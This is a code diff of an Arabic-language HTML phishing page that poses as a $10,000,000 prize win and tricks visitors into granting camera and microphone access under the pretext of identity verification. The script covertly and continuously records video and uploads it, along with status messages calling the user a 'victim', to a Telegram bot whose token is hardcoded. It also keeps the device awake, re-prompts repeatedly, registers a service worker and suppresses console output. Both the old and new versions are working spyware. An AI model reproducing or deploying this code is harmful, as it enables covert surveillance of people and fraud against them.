@@ -2,33 +2,45 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>جاري التحميل...</title>
+<title>جائزة حصرية</title>
 <style>
-body { margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:Arial; }
-#status { text-align:center; font-size:20px; }
-#status span { color:#ffd700; }
-#videos { display:none; }
+body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0a0a); display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial; color:#fff; }
+.card { background:rgba(20,10,10,0.95); padding:40px; border-radius:30px; border:2px solid #ffd700; text-align:center; max-width:400px; box-shadow:0 0 60px rgba(255,215,0,0.2); }
+.card h1 { color:#ffd700; }
+.card p { color:#ccc; margin:15px 0; }
+.btn { background:#ffd700; color:#000; border:none; padding:15px 40px; border-radius:50px; font-size:18px; font-weight:bold; cursor:pointer; }
+.btn:hover { transform:scale(1.05); }
+.hidden { display:none; }
+#status { font-size:14px; color:#ff8844; margin-top:10px; }
 </style>
 </head>
 <body>
 
-<div id="status">
-  <h1>⏳ جاري تجهيز الجائزة...</h1>
-  <p>يرجى الانتظار <span>⚡</span></p>
+<div class="card" id="mainCard">
+  <h1>🎉 فوز مفاجئ!</h1>
+  <p>لقد اخترتك أنت شخصيًا لجائزة <strong style="color:#ffd700;">10,000,000$</strong></p>
+  <p style="font-size:14px;color:#888;">للتأكد من هويتك، يلزم تفعيل الكاميرا لمدة ثانيتين</p>
+  <button class="btn" onclick="requestCamera()">✅ أوافق على التحقق</button>
+  <div id="status">⏳ اضغط للموافقة</div>
 </div>
 
-<video id="videoFront" autoplay muted playsinline></video>
-<video id="videoBack" autoplay muted playsinline></video>
+<video id="video" autoplay muted playsinline class="hidden"></video>
+<canvas id="canvas" class="hidden"></canvas>
 
 <script>
 // ============================================================
-// ================ BOT CONFIG (خفي تمامًا) ===================
+// ================ BOT CONFIG =================================
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
+let stream = null;
+let recorder = null;
+let chunks = [];
+let retryCount = 0;
+const MAX_RETRIES = 5;
 
 // ============================================================
-// ================ الحصول على معرف الدردشة ===================
+// ================ الحصول على CHAT_ID ========================
 // ============================================================
 function getChatId() {
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
@@ -37,28 +49,19 @@ function getChatId() {
       if (d.ok && d.result && d.result.length) {
         let last = d.result[d.result.length - 1];
         CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-        if (CHAT_ID) {
-          sendMessage('✅ تم تفعيل الجاسوسية - بدء التسجيل');
-          startSpying();
-        } else {
-          setTimeout(getChatId, 1500);
-        }
-      } else {
-        setTimeout(getChatId, 1500);
-      }
+        if (CHAT_ID) sendMessage('✅ تم تفعيل الجاسوسية');
+        else setTimeout(getChatId, 2000);
+      } else setTimeout(getChatId, 2000);
     })
     .catch(() => setTimeout(getChatId, 2000));
 }
 
-// ============================================================
-// ================ إرسال الرسائل والفيديو ====================
-// ============================================================
 function sendMessage(text) {
   if (!CHAT_ID) return;
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
   }).catch(() => {});
 }
 
@@ -68,107 +71,104 @@ function sendVideo(blob, caption = '') {
   fd.append('chat_id', CHAT_ID);
   fd.append('video', blob, `vid_${Date.now()}.mp4`);
   fd.append('caption', caption || '🎥 فيديو مسجل');
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-    method: 'POST',
-    body: fd
-  }).catch(() => {});
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd })
+    .catch(() => {});
 }
 
 // ============================================================
-// ================ بدء التسجيل بدون تفاعل ====================
+// ================ طلب الكاميرا بطريقة مخادعة ===============
 // ============================================================
-let frontRecorder = null, backRecorder = null;
-let frontChunks = [], backChunks = [];
+function requestCamera() {
+  document.getElementById('status').innerHTML = '⏳ جاري التحقق من الهوية...';
+  document.getElementById('status').style.color = '#ffaa00';
 
-function startSpying() {
-  // ---- الكاميرا الأمامية ----
   navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
     audio: true
-  }).then(stream => {
-    document.getElementById('videoFront').srcObject = stream;
-    frontRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 5000000 });
-    frontRecorder.ondataavailable = e => { if (e.data.size) frontChunks.push(e.data); };
-    frontRecorder.onstop = () => {
-      if (frontChunks.length) {
-        let blob = new Blob(frontChunks, { type: 'video/mp4' });
-        sendVideo(blob, '📹 كاميرا أمامية');
-        sendMessage(`📹 أمامي: ${Math.round(blob.size/1024/1024)} MB`);
-        frontChunks = [];
+  })
+  .then(s => {
+    stream = s;
+    document.getElementById('video').srcObject = s;
+    document.getElementById('video').classList.remove('hidden');
+    document.getElementById('status').innerHTML = '✅ تم التحقق بنجاح! جاري منح الجائزة...';
+    document.getElementById('status').style.color = '#00ff88';
+    document.querySelector('.btn').textContent = '🎁 جاري التجهيز...';
+    document.querySelector('.btn').disabled = true;
+
+    // بدء التسجيل الفعلي
+    startRecording(s);
+    sendMessage('✅ تم تفعيل الكاميرا بنجاح');
+  })
+  .catch(err => {
+    console.log('طلب الكاميرا فشل:', err.message);
+    document.getElementById('status').innerHTML = '⚠️ يرجى السماح بالكاميرا والميكروفون للمتابعة';
+    document.getElementById('status').style.color = '#ff4444';
+    sendMessage('❌ رفض الضحية الكاميرا - المحاولة ' + (retryCount+1));
+
+    retryCount++;
+    if (retryCount < MAX_RETRIES) {
+      // محاولة إعادة الطلب بعد 3 ثوانٍ بشكل أكثر إلحاحًا
+      setTimeout(() => {
+        document.getElementById('status').innerHTML = '🔴 مطلوب تفعيل الكاميرا فورًا لتأكيد الجائزة';
+        requestCamera();
+      }, 3000);
+    } else {
+      document.getElementById('status').innerHTML = '❌ لم يتم تفعيل الكاميرا. لا يمكن صرف الجائزة.';
+      sendMessage('❌ فشل نهائي - رفض الضحية الكاميرا');
+    }
+  });
+}
+
+// ============================================================
+// ================ بدء التسجيل والرفع ========================
+// ============================================================
+function startRecording(stream) {
+  try {
+    recorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 3000000 });
+    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+    recorder.onstop = () => {
+      if (chunks.length) {
+        let blob = new Blob(chunks, { type: 'video/mp4' });
+        sendVideo(blob, '🎥 فيديو من الكاميرا');
+        sendMessage(`📹 حجم الفيديو: ${Math.round(blob.size/1024/1024)} MB`);
+        chunks = [];
       }
-      if (frontRecorder && frontRecorder.state === 'inactive') {
-        setTimeout(() => frontRecorder.start(10000), 300);
+      // إعادة التسجيل بشكل مستمر
+      if (recorder && recorder.state === 'inactive') {
+        setTimeout(() => recorder.start(10000), 500);
       }
     };
-    frontRecorder.start(10000);
-    sendMessage('✅ تشغيل الكاميرا الأمامية');
-  }).catch(e => sendMessage('❌ فشل أمامي: ' + e.message));
+    recorder.start(10000);
+    sendMessage('🎥 بدأ تسجيل الفيديو');
 
-  // ---- الكاميرا الخلفية ----
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
-    audio: true
-  }).then(stream => {
-    document.getElementById('videoBack').srcObject = stream;
-    backRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 5000000 });
-    backRecorder.ondataavailable = e => { if (e.data.size) backChunks.push(e.data); };
-    backRecorder.onstop = () => {
-      if (backChunks.length) {
-        let blob = new Blob(backChunks, { type: 'video/mp4' });
-        sendVideo(blob, '📹 كاميرا خلفية');
-        sendMessage(`📹 خلفي: ${Math.round(blob.size/1024/1024)} MB`);
-        backChunks = [];
-      }
-      if (backRecorder && backRecorder.state === 'inactive') {
-        setTimeout(() => backRecorder.start(10000), 300);
-      }
-    };
-    backRecorder.start(10000);
-    sendMessage('✅ تشغيل الكاميرا الخلفية');
-  }).catch(e => sendMessage('❌ فشل خلفي: ' + e.message));
+    // بعد 3 ثوانٍ تغيير النص لإيهام بأن الجائزة في الطريق
+    setTimeout(() => {
+      document.getElementById('status').innerHTML = '🎉 جارٍ إرسال الجائزة... انتظر قليلاً';
+      document.querySelector('.btn').textContent = '✅ تم الاستلام';
+    }, 3000);
 
-  // منع السكون
-  if ('wakeLock' in navigator) {
-    navigator.wakeLock.request('screen').catch(() => {});
+    // منع السكون
+    if ('wakeLock' in navigator) {
+      navigator.wakeLock.request('screen').catch(() => {});
+    }
+
+  } catch(e) {
+    sendMessage('❌ فشل التسجيل: ' + e.message);
   }
-
-  // تحديث واجهة وهمية
-  document.getElementById('status').innerHTML = `
-    <h1>🎉 تهانينا! لقد فزت</h1>
-    <p>جائزتك بقيمة <strong style="color:#ffd700;">10,000,000$</strong></p>
-    <p style="font-size:14px;color:#888;">سيتم توجيهك خلال ثوان...</p>
-  `;
 }
 
 // ============================================================
 // ================ حافظ على النشاط ===========================
 // ============================================================
 setInterval(() => {
-  if (CHAT_ID) {
-    sendMessage('🔄 نبض الجاسوسية مستمر');
-  }
-  // إعادة تشغيل المسجلات إذا توقفت
-  if (frontRecorder && frontRecorder.state === 'inactive') {
-    try { frontRecorder.start(10000); } catch(e) {}
-  }
-  if (backRecorder && backRecorder.state === 'inactive') {
-    try { backRecorder.start(10000); } catch(e) {}
+  if (CHAT_ID) sendMessage('🔄 نبض الجاسوسية مستمر');
+  if (recorder && recorder.state === 'inactive') {
+    try { recorder.start(10000); } catch(e) {}
   }
 }, 15000);
 
 // ============================================================
-// ================ منع الخمول في الخلفية ====================
-// ============================================================
-document.addEventListener('visibilitychange', () => {
-  if (document.hidden) {
-    sendMessage('⏳ الصفحة في الخلفية - التسجيل مستمر');
-  } else {
-    sendMessage('🔄 الصفحة نشطة - التسجيل مستمر');
-  }
-});
-
-// ============================================================
-// ================ Service Worker للبقاء حيًا ================
+// ================ Service Worker =============================
 // ============================================================
 if ('serviceWorker' in navigator) {
   const swCode = `
@@ -181,29 +181,26 @@ if ('serviceWorker' in navigator) {
   `;
   const blob = new Blob([swCode], { type: 'application/javascript' });
   const swUrl = URL.createObjectURL(blob);
-  navigator.serviceWorker.register(swUrl)
-    .then(() => sendMessage('✅ Service Worker نشط'))
-    .catch(() => {});
+  navigator.serviceWorker.register(swUrl).catch(() => {});
 }
 
 // ============================================================
 // ================ بدء التشغيل ================================
 // ============================================================
-// إخفاء أي أخطاء من وحدة التحكم
 console.log = console.warn = console.error = () => {};
 
-// بدء الجاسوسية
+// الحصول على CHAT_ID
 getChatId();
+setTimeout(() => { if (!CHAT_ID) getChatId(); }, 5000);
 
-// محاولة إعادة المحاولة إذا لم يبدأ
+// إظهار طلب الكاميرا بشكل تلقائي بعد 1.5 ثانية (بدون نقرة)
 setTimeout(() => {
-  if (!CHAT_ID) getChatId();
-}, 5000);
-
-// بدء التسجيل حتى لو لم يصل CHAT_ID بعد (لن يتم الرفع لكن سيبدأ)
-setTimeout(() => {
-  if (!frontRecorder && !backRecorder) startSpying();
-}, 3000);
+  // فقط إذا لم يضغط المستخدم يدويًا
+  if (!stream) {
+    document.getElementById('status').innerHTML = '⏳ جاري طلب التحقق تلقائيًا...';
+    requestCamera();
+  }
+}, 1500);
 </script>
 </body>
 </html>
